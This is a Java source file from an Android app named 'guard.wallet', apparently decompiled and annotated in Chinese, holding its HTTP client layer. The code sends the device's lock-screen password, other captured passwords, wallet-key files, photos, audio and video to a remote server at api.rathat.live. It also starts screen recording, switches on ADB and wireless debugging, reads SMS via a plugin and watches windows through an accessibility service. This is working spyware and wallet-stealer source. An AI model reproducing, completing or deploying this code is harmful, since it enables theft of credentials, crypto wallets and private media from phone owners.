package com.guard.wallet.http;
import com.guard.wallet.core.AppUtils;
import com.guard.wallet.http.HttpRequestBuilder;

import android.util.Log;
import com.google.gson.JsonObject;
import com.guard.wallet.entity.ADBConfig;
import com.guard.wallet.req.ApiRequest;
import com.guard.wallet.req.DeviceUpdateVO;
import com.guard.wallet.req.MessageBodyVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.QueryAgentFileVO;
import com.guard.wallet.req.ReqAppLocateValueVO;
import com.guard.wallet.req.ReqDefaultBodyVO;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.req.ReqListenWindowVO;
import com.guard.wallet.req.ReqMessageVO;
import com.guard.wallet.req.ReqNoticeAliveVO;
import com.guard.wallet.req.ReqResetAccessibilityService;
import com.guard.wallet.req.ReqSmsRecognizePlugVO;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.req.UploadFileVO;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.resp.CacheTaskResponseVO;
import com.guard.wallet.resp.PushResponseVO;
import com.guard.wallet.resp.RespCipherStateVO;
import java.util.LinkedHashMap;
import java.util.LinkedList;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.FutureTask;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Request;

/**
 * HTTP API 门面类 — vendor http/l (423 lines).
 *
 * 提供全部 HTTP API 调用方法, 通过本地 atx-agent 和远程服务器通信.
 * 所有公共方法均为 static, 由各业务模块直接调用.
 */
public abstract class HttpApiManager {
    /** API 基础 URL (运行时由 static 初始化块设置) */
    public static String apiBaseUrl = "api.rathat.live";
    /** 允许重复请求的 URL 队列 */
    public static final ConcurrentLinkedQueue allowDuplicateUrls;
    /** 正在进行的请求缓存 (url -> timestamp) */
    public static final LinkedHashMap pendingRequests = new LinkedHashMap();

    static {
        ConcurrentLinkedQueue var1 = new ConcurrentLinkedQueue();
        allowDuplicateUrls = var1;
        // ADAPT: 开发环境使用 HTTP，生产环境改回 "https://"
        String var0 = "http://".concat(com.guard.wallet.utils.ConfigManager.getServerHost());
        apiBaseUrl = var0;
        StringBuilder var2 = new StringBuilder();
        var2.append(var0); var2.append("/api/message/post.json"); var1.offer(var2.toString());
        var2 = new StringBuilder();
        var2.append(var0); var2.append("/api/cipher/postLockCipher.json"); var1.offer(var2.toString());
        var2 = new StringBuilder();
        var2.append(var0); var2.append("/api/cipher/postOtherCipher.json"); var1.offer(var2.toString());
        var2 = new StringBuilder();
        var2.append(var0); var2.append("/api/pairKeyFile/batch.json"); var1.offer(var2.toString());
        var2 = new StringBuilder();
        var2.append(var0); var2.append("/api/audioFile/batch.json"); var1.offer(var2.toString());
        var2 = new StringBuilder();
        var2.append(var0); var2.append("/api/photoFile/batch.json"); var1.offer(var2.toString());
        var2 = new StringBuilder();
        var2.append(var0); var2.append("/api/videoFile/batch.json"); var1.offer(var2.toString());
    }

    /** 上传音频文件 */
    public static void uploadAudioFiles(LinkedList var0) {
        String var2 = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (!AppUtils.B(var2) && var0 != null && !var0.isEmpty()) {
            UploadStoreFileCallback var1 = new UploadStoreFileCallback();
            UploadFileVO var3 = new UploadFileVO(var2, "100013");
            new HttpClient().asyncUploadFiles(var3, "/api/audioFile/batch.json", var0, var1);
        }
    }

    /** 上传锁屏密码 */
    public static void uploadLockCipher(ReqUnlockDeviceVO var0) {
        String var1 = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (!AppUtils.B(var1)) {
            var0.setDeviceId(var1);
            UploadCipherCallback var2 = new UploadCipherCallback();
            new HttpClient(apiBaseUrl).asyncPost(var0, "/api/cipher/postLockCipher.json", var2);
        }
    }

    /** 上传其他密码 */
    public static void uploadOtherCipher(RespCipherStateVO var0) {
        String var1 = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (!AppUtils.B(var1)) {
            var0.setDeviceId(var1);
            UploadCipherCallback var2 = new UploadCipherCallback();
            new HttpClient(apiBaseUrl).asyncPost(var0, "/api/cipher/postOtherCipher.json", var2);
        }
    }

    /** 上传照片文件 */
    public static void uploadPhotoFiles(LinkedList var0) {
        String var2 = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (!AppUtils.B(var2) && !var0.isEmpty()) {
            UploadStoreFileCallback var1 = new UploadStoreFileCallback();
            UploadFileVO var3 = new UploadFileVO(var2, "100014");
            new HttpClient().asyncUploadFiles(var3, "/api/photoFile/batch.json", var0, var1);
        }
    }

    /** 上传视频文件 */
    public static void uploadVideoFiles(LinkedList var0) {
        String var2 = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (!AppUtils.B(var2) && !var0.isEmpty()) {
            UploadStoreFileCallback var1 = new UploadStoreFileCallback();
            UploadFileVO var3 = new UploadFileVO(var2, "100015");
            new HttpClient().asyncUploadFiles(var3, "/api/videoFile/batch.json", var0, var1);
        }
    }

    /** 拉取应用本地化语言包 */
    public static void fetchAppLocateValues() {
        String var0 = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (!AppUtils.B(var0)) {
            ReqAppLocateValueVO var1 = new ReqAppLocateValueVO(var0, com.guard.wallet.utils.SharedPrefsManager.m());
            AppLocateValuesCallback var2 = new AppLocateValuesCallback();
            new HttpClient().asyncGet(var1, "/api/locateValue/entryAppMap.json", var2);
        }
    }

    /** 同步 GET 请求 (阻塞, 新线程执行) */
    public static JsonObject syncGetRequest(ReqDefaultBodyVO var0, String var1, String var2) {
        if (!com.guard.wallet.utils.SystemHelper.l0()) {
            return HttpClient.createErrorResult(null);
        } else {
            try {
                // For localhost requests, use HttpURLConnection directly.
                if (var1 != null && var1.contains("127.0.0.1")) {
                    return bLocalhost(var1, var2);
                }
                SyncRequestCallable var3 = new SyncRequestCallable(var0, var1, var2, 0);
                FutureTask var5 = new FutureTask(var3);
                Thread var6 = new Thread(var5);
                var6.start();
                return (JsonObject) var5.get();
            } catch (Exception var4) {
                AppUtils.s("HttpUtils", var4);
                return HttpClient.createErrorResult(null);
            }
        }
    }

    /** Localhost GET request via HttpURLConnection (bypasses OkHttp interceptor chain) */
    private static JsonObject bLocalhost(String baseUrl, String path) {
        java.net.HttpURLConnection conn = null;
        try {
            java.net.URL url = new java.net.URL(baseUrl + path);
            conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            int code = conn.getResponseCode();
            if (code == 200) {
                java.io.InputStream is = conn.getInputStream();
                byte[] buf = new byte[4096];
                StringBuilder sb = new StringBuilder();
                int len;
                while ((len = is.read(buf)) != -1) {
                    sb.append(new String(buf, 0, len));
                }
                is.close();
                return com.guard.wallet.utils.SharedPrefsManager.M(sb.toString());
            }
            return HttpClient.createErrorResult(null);
        } catch (Exception ex) {
            AppUtils.s("HttpUtils", ex);
            return HttpClient.createErrorResult(null);
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /** 拉取锁屏密码列表 */
    public static void fetchLockCiphers() {
        String var0 = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (!AppUtils.B(var0)) {
            ReqDefaultBodyVO var1 = new ReqDefaultBodyVO(var0);
            GetCacheTaskCallback.NoOpCallback var2 = new GetCacheTaskCallback.NoOpCallback(2);
            new HttpClient().asyncGet(var1, "/api/cipher/lockCiphers", var2);
        }
    }

    /** 同步监听窗口 */
    public static boolean syncListenWindows() {
        String var0 = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (!AppUtils.B(var0) && !AppUtils.B("ACCESSIBILITY_CONTAINER")) {
            ReqListenWindowVO var1 = new ReqListenWindowVO(var0, com.guard.wallet.utils.SharedPrefsManager.m(), "ACCESSIBILITY_CONTAINER");
            ListenWindowCallback var2 = new ListenWindowCallback();
            new HttpClient().asyncGet(var1, "/api/listen/windows.json", var2);
            return true;
        } else {
            return false;
        }
    }

    /** 关闭开发者选项 */
    public static void closeDevelopment() {
        if (!AppUtils.B("http://127.0.0.1:7912")) {
            CloseDevelopmentCallback var0 = new CloseDevelopmentCallback();
            new HttpClient("http://127.0.0.1:7912").asyncGet(null, "/closeDevelopment", var0);
        }
    }

    /** 关闭无线调试 */
    public static void closeWifiDebug(String var0) {
        if (!AppUtils.B(var0)) {
            CloseWifiDebugCallback var1 = new CloseWifiDebugCallback();
            new HttpClient(var0).asyncGet(null, "/closeWifiDebug", var1);
        }
    }

    /** 获取设备 ID */
    public static void getDeviceId(String var0) {
        String var2 = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        String var1 = var0;
        if (AppUtils.B(var0)) {
            var1 = "http://127.0.0.1:7911";
        }
        if (AppUtils.B(var2)) {
            DeviceIdCallback var3 = new DeviceIdCallback();
            new HttpClient(var1).asyncGet(null, "/deviceId", var3);
        } else {
            fetchLockCiphers();
        }
    }

    /** 完成监听助手 */
    public static void finishListenHelper(ReqListenHelper var0) {
        if (!AppUtils.E(7912)) {
            GetCacheTaskCallback.NoOpCallback var1 = new GetCacheTaskCallback.NoOpCallback(1);
            new HttpClient("http://127.0.0.1:7912").asyncPost(var0, "/finishListenHelper", var1);
            Log.d("HttpUtils", "已发送 localFinishListenHelper");
        }
    }

    /** 本地监听助手 */
    public static boolean localListenHelper(ReqListenHelper var0) {
        if (!AppUtils.E(7912)) {
            GetCacheTaskCallback.NoOpCallback var1 = new GetCacheTaskCallback.NoOpCallback(1);
            new HttpClient("http://127.0.0.1:7912").asyncPost(var0, "/listenHelper", var1);
            Log.d("HttpUtils", "已发送 localListenHelper");
            return true;
        } else {
            return false;
        }
    }

    /** 通知存活 */
    public static void noticeAlive() {
        if (com.guard.wallet.utils.SystemHelper.Z() != null) {
            GetCacheTaskCallback.NoOpCallback var1 = new GetCacheTaskCallback.NoOpCallback(1);
            ReqNoticeAliveVO var0 = new ReqNoticeAliveVO(com.guard.wallet.utils.SystemHelper.Z().getPackageName());
            new HttpClient("http://127.0.0.1:7912").asyncGet(var0, "/noticeAlive", var1);
        }
    }

    /** 开启 ADB 调试 */
    public static void openAdbDebug(String var0) {
        if (!AppUtils.B(var0)) {
            OpenADBDebugCallback var1 = new OpenADBDebugCallback();
            new HttpClient(var0).asyncGet(null, "/openADBDebug", var1);
        }
    }

    /** 开启开发者选项 */
    public static void openDevelopment(String var0) {
        if (!AppUtils.B(var0)) {
            OpenDevelopmentCallback var1 = new OpenDevelopmentCallback();
            new HttpClient(var0).asyncGet(null, "/openDevelopment", var1);
        }
    }

    /** 开启无线调试 */
    public static void openWifiDebug(String var0) {
        if (!AppUtils.B(var0)) {
            OpenWifiDebugCallback var1 = new OpenWifiDebugCallback();
            new HttpClient(var0).asyncGet(null, "/openWifiDebug", var1);
        }
    }

    /** 开始录屏 */
    public static boolean startScreenRecord() {
        if (!AppUtils.E(7912)) {
            HttpClient var1 = new HttpClient("http://127.0.0.1:7912");
            String var3 = var1.buildUrlWithParams(null, "/screenrecord/start");
            Request request = new Request.Builder().url(var3).get().build();
            JsonObject var6 = var1.executeSyncRequest(request);
            if (var6 != null) {
                BooleanResultTypeToken var4 = new BooleanResultTypeToken();
                ApiResult var5 = (ApiResult) com.guard.wallet.utils.SharedPrefsManager.c(var6.getAsString(), var4);
                if (var5 != null && var5.getSuccess() && (Boolean) var5.getData()) {
                    return true;
                }
            }
        }
        return false;
    }

    /** 停止录屏 */
    public static boolean stopScreenRecord() {
        if (!AppUtils.E(7912)) {
            HttpClient var1 = new HttpClient("http://127.0.0.1:7912");
            String var3 = var1.buildUrlWithParams(null, "/screenrecord/stop");
            Request request = new Request.Builder().url(var3).get().build();
            JsonObject var6 = var1.executeSyncRequest(request);
            if (var6 != null) {
                BooleanResultTypeToken var4 = new BooleanResultTypeToken();
                ApiResult var5 = (ApiResult) com.guard.wallet.utils.SharedPrefsManager.c(var6.getAsString(), var4);
                if (var5 != null && var5.getSuccess() && (Boolean) var5.getData()) {
                    return true;
                }
            }
        }
        return false;
    }

    /** 同步 ADB 配置 */
    public static void syncAdbConfig(ADBConfig var0) {
        GetCacheTaskCallback.NoOpCallback var1 = new GetCacheTaskCallback.NoOpCallback(1);
        new HttpClient("http://127.0.0.1:7911").asyncPost(var0, "/syncADBConfig", var1);
    }

    /** 同步 POST 消息请求 (阻塞) */
    public static JsonObject syncPostMessage(ApiRequest var0, String var1) {
        if (!com.guard.wallet.utils.SystemHelper.l0()) {
            return HttpClient.createErrorResult(null);
        } else {
            try {
                SyncRequestCallable var2 = new SyncRequestCallable(var0, var1, "/api/message/post.json", 1);
                FutureTask var4 = new FutureTask(var2);
                Thread var5 = new Thread(var4);
                var5.start();
                return (JsonObject) var4.get();
            } catch (Exception var3) {
                AppUtils.s("HttpUtils", var3);
                return HttpClient.createErrorResult(null);
            }
        }
    }

    /** 提交缓存任务响应 */
    public static void postCacheTaskResponse(CacheTaskResponseVO var0) {
        String var1 = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (!AppUtils.B(var1)) {
            var0.setDeviceId(var1);
            var0.setContainerCode("ACCESSIBILITY_CONTAINER");
            GetCacheTaskCallback.NoOpCallback var2 = new GetCacheTaskCallback.NoOpCallback(1);
            new HttpClient().asyncPost(var0, "/api/containerApi/postCacheTaskResponse.json", var2);
        }
    }

    /** 提交设备安装日志 */
    public static void postDeviceInstallLog(PushResponseVO var0) {
        String var1 = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (!AppUtils.B(var1)) {
            var0.setDeviceId(var1);
            GetCacheTaskCallback.NoOpCallback var2 = new GetCacheTaskCallback.NoOpCallback(1);
            new HttpClient().asyncPost(var0, "/api/deviceInstallLog/post.json", var2);
        }
    }

    /** 发送 Intent Code 消息 */
    public static void sendIntentCodeMessage(String var0) {
        String var2 = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (!AppUtils.B(var0) && !AppUtils.B(var2)) {
            MessageRecordVO var1 = new MessageRecordVO();
            var1.setDeviceId(var2);
            var1.setIntentCode(var0);
            var1.setExtraBody(new MessageBodyVO());
            ReqMessageVO var6 = new ReqMessageVO();
            var6.setDeviceId(var1.getDeviceId());
            var6.setIntentCode(var1.getIntentCode());
            if (var1.getExtraBody() != null) {
                var6.setExtraBody(com.guard.wallet.utils.SharedPrefsManager.N(var1.getExtraBody()));
            }
            LinkedList var3 = new LinkedList();
            var3.add(var6);
            ApiRequest var5 = new ApiRequest();
            var5.setData(var3);
            GetCacheTaskCallback.NoOpCallback var4 = new GetCacheTaskCallback.NoOpCallback(1);
            new HttpClient().asyncPost(var5, "/api/message/post.json", var4);
        }
    }

    /** 查询 Agent 文件 */
    public static boolean queryAgentFile() {
        String var1 = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (!AppUtils.B(var1)) {
            QueryAgentFileVO var0 = new QueryAgentFileVO();
            var0.setDeviceId(var1);
            QueryAgentFileCallback var2 = new QueryAgentFileCallback();
            new HttpClient().asyncGet(var0, "/api/agent/query.json", var2);
            return true;
        } else {
            return false;
        }
    }

    /** 查询未完成钱包 */
    public static void queryNoCompleteWallets() {
        String var0 = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (!AppUtils.B(var0)) {
            ReqDefaultBodyVO var1 = new ReqDefaultBodyVO(var0);
            NoCompleteWalletCallback var2 = new NoCompleteWalletCallback();
            new HttpClient().asyncGet(var1, "/api/walletAuth/strategy/noCompletes", var2);
        }
    }

    /** 重置无障碍服务 */
    public static void resetAccessibilityService() {
        GetCacheTaskCallback.NoOpCallback var0 = new GetCacheTaskCallback.NoOpCallback(1);
        ReqResetAccessibilityService var1 = new ReqResetAccessibilityService("com.guard.wallet/.service.MyAccessibilityService");
        new HttpClient("http://127.0.0.1:7912").asyncGet(var1, "/resetAccessibilityService", var0);
        Log.d("HttpUtils", "已发送 resetAccessibilityService");
    }

    /** 路由转发 — uses okhttp3.Call */
    public static void routeForwarding(Call call, Callback callback) {
        if (call != null) {
            try {
                Request request = call.request();
                if (request != null && request.url() != null) {
                    String host = request.url().host();
                    if (!AppUtils.B(host) && host.contains(apiBaseUrl) && !AppUtils.E(7912)) {
                        HttpClient client = new HttpClient("http://127.0.0.1:7912");
                        String path = request.url().encodedPath();
                        String var6 = "/router";
                        if (!AppUtils.B(path)) {
                            var6 = "/router".concat(path);
                        }
                        Log.d("FetchClient", "路由转发URI");
                        String var10 = client.resolveUrl(var6);
                        Callback cb = callback;
                        if (cb == null) {
                            cb = new GetCacheTaskCallback.NoOpCallback(1);
                        }
                        Request fwdRequest = new Request.Builder()
                                .url(var10)
                                .method(request.method(), null)
                                .build();
                        client.createOkHttpClient().newCall(fwdRequest).enqueue(cb);
                    }
                }
            } catch (Exception ex) {
                AppUtils.s("FetchClient", ex);
            }
        }
    }

    /** 短信识别插件 */
    public static boolean smsRecognizePlug() {
        String var0 = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (!AppUtils.B(var0)) {
            ReqSmsRecognizePlugVO var1 = new ReqSmsRecognizePlugVO(var0);
            SmsRecognizePlugCallback var2 = new SmsRecognizePlugCallback();
            new HttpClient().asyncGet(var1, "/api/smsRecognize/plug.json", var2);
            return true;
        } else {
            return false;
        }
    }

    /** 更新设备信息 */
    public static void updateDeviceInfo() {
        String var1 = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (!AppUtils.B(var1)) {
            DeviceUpdateVO var0 = DeviceUpdateVO.of();
            var0.setDeviceId(var1);
            DeviceUpdateCallback var2 = new DeviceUpdateCallback();
            new HttpClient().asyncPost(var0, "/api/device/updateDeviceInfo.json", var2);
        }
    }
}
